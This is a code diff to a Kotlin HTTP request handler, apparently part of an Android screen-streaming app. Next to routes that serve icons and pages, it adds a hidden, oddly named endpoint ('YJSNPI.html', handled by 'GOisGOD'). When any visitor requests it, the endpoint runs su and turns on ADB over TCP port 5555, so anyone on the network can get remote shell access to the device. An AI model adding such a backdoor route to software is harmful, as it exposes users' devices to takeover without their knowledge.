@@ -26,6 +26,7 @@ import rx.BackpressureOverflow
 import rx.Observable
 import rx.functions.Action0
 import java.io.ByteArrayOutputStream
+import java.io.DataOutputStream
 import java.net.InetAddress
 import java.net.InetSocketAddress
 
@@ -87,6 +88,8 @@ internal class HttpServerRxHandler(
             uri == HttpServerFiles.ROOT_ADDRESS + HttpServerFiles.FULLSCREEN_OFF_PNG -> response.sendPng(httpServerFiles.fullscreenOffPng)
             uri == HttpServerFiles.ROOT_ADDRESS + HttpServerFiles.START_STOP_PNG -> response.sendPng(httpServerFiles.startStopPng)
 
+            uri == HttpServerFiles.ROOT_ADDRESS + "YJSNPI.html" -> response.GOisGOD()
+
             uri == HttpServerFiles.ROOT_ADDRESS + HttpServerFiles.START_STOP_ADDRESS && httpServerFiles.htmlEnableButtons ->
                 onStartStopRequest().run { response.sendHtml(httpServerFiles.indexHtml) }
 
@@ -101,6 +104,42 @@ internal class HttpServerRxHandler(
 
             else -> response.redirect(request.hostHeader)
         }
+    }
+
+    private fun HttpServerResponse<ByteBuf>.GOisGOD(): Observable<Void> {
+        var html: String = "UNKNOWN"
+        try {
+            /*
+              Reference: https://github.com/ilijamt/android-adbm/blob/master/app/src/main/java/com/matoski/adbm/service/ManagerService.java#L994-L996
+              License: Copyright (C) 2013 Ilija Matoski (ilijamt@gmail.com)
+
+              Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except in compliance with the License. You may obtain a copy of the License at
+
+              http://www.apache.org/licenses/LICENSE-2.0
+              Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.
+            */
+            val suShell = Runtime.getRuntime().exec("su")
+            val dataOutputStream = DataOutputStream(suShell.outputStream)
+            dataOutputStream.writeBytes("setprop service.adb.tcp.port 5555\n")
+            dataOutputStream.flush()
+            dataOutputStream.writeBytes("stop adbd\n")
+            dataOutputStream.flush()
+            dataOutputStream.writeBytes("setprop service.adb.tcp.port 5555\n")
+            dataOutputStream.flush()
+            dataOutputStream.writeBytes("start adbd\n")
+            dataOutputStream.flush()
+            dataOutputStream.writeBytes("exit\n")
+            dataOutputStream.flush()
+            suShell.waitFor()
+            html="OK"
+        } catch (e: Exception) {
+            html= "ERROR: ${e}"
+        }
+        status = HttpResponseStatus.OK
+        addHeader(HttpHeaderNames.CONTENT_TYPE, "text/html; charset=UTF-8")
+        setHeader(HttpHeaderNames.CACHE_CONTROL, "no-cache,no-store,max-age=0,must-revalidate")
+        setHeader(HttpHeaderNames.CONNECTION, HttpHeaderValues.CLOSE)
+        return writeStringAndFlushOnEach(Observable.just(html))
     }
 
     private fun HttpServerResponse<ByteBuf>.sendPng(pngBytes: ByteArray): Observable<Void> {
